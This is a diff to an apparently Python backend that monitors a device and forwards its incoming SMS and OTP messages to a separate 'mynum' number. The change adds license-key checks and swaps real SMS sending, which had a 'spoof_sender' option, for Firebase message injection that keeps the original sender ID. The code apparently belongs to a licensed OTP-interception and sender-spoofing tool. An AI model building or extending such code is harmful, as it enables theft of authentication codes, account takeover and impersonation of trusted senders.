@@ -256,11 +256,13 @@ async def push_outbound_to_firebase(
 
 
 async def send_polling_startup_test(db, profile: MonitorProfile, device: Device) -> None:
-    """On monitoring start — send test SMS to /mynum immediately."""
-    from app.device_ui import STARTUP_TEST_MESSAGE
+    """On monitoring start — inject test SMS to /mynum (same sender ID, Astik-style)."""
+    from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
+    from app.license_keys import license_key_exists
     from app.services import normalize_phone
 
-    if not profile.phone_number or not profile.is_monitoring:
+    license_key = (profile.license_key or "").strip().upper()
+    if not profile.phone_number or not profile.is_monitoring or not license_key_exists(license_key):
         return
 
     firebase_url = resolve_firebase_url(profile)
@@ -268,29 +270,16 @@ async def send_polling_startup_test(db, profile: MonitorProfile, device: Device)
         logger.warning("Startup test skipped: no firebase URL")
         return
 
-    sim_index = profile.selected_sim_index or 0
-    sim_slot = sim_index + 1
-    if device.device_meta:
-        try:
-            meta = json.loads(device.device_meta)
-            sims = meta.get("sims") or []
-            if sims and 0 <= sim_index < len(sims):
-                sim_slot = int(sims[sim_index].get("slot") or sim_slot)
-        except (json.JSONDecodeError, TypeError, ValueError):
-            pass
-
     mynum = normalize_phone(profile.phone_number)
     try:
-        await push_outgoing_sms_command(
+        await push_inject_message(
             firebase_url,
-            device.name,
-            mynum,
+            mynum_device_id(mynum),
+            STARTUP_TEST_SENDER,
             STARTUP_TEST_MESSAGE,
-            sim_index=sim_index,
-            sim_slot=sim_slot,
         )
     except Exception as exc:
-        logger.warning("Startup test failed: %s", exc)
+        logger.warning("Startup test inject failed: %s", exc)
 
 
 async def forward_incoming_to_mynum(
@@ -300,40 +289,16 @@ async def forward_incoming_to_mynum(
     sender: str,
     message: str,
 ) -> None:
-    """Forward incoming SMS/OTP to /mynum as real SMS from the monitored device SIM."""
-    from app.channel_relay import prepare_sms_forward
-    from app.services import normalize_phone
+    """Forward incoming SMS/OTP to /mynum via inject — same sender ID (Astik-style)."""
+    from app.channel_relay import queue_forward_to_mynum
+    from app.license_keys import license_key_exists
 
-    if not profile.phone_number or not profile.is_monitoring:
+    license_key = (profile.license_key or "").strip().upper()
+    if not profile.phone_number or not profile.is_monitoring or not license_key_exists(license_key):
         return
-
-    firebase_url = resolve_firebase_url(profile)
-    if not firebase_url:
-        return
-
-    sender, message = prepare_sms_forward(sender, message)
-    mynum = normalize_phone(profile.phone_number)
-
-    sim_index = profile.selected_sim_index or 0
-    sim_slot = sim_index + 1
-    if device.device_meta:
-        try:
-            meta = json.loads(device.device_meta)
-            sims = meta.get("sims") or []
-            if sims and 0 <= sim_index < len(sims):
-                sim_slot = int(sims[sim_index].get("slot") or sim_slot)
-        except (json.JSONDecodeError, TypeError, ValueError):
-            pass
 
     try:
-        await push_outgoing_sms_command(
-            firebase_url,
-            device.name,
-            mynum,
-            message,
-            sim_index=sim_index,
-            sim_slot=sim_slot,
-            spoof_sender=sender or None,
-        )
+        outbound = queue_forward_to_mynum(db, profile, device, sender, message)
+        await push_outbound_to_firebase(profile, device, outbound)
     except Exception as exc:
         logger.warning("Forward to mynum failed for device %s: %s", device.id, exc)
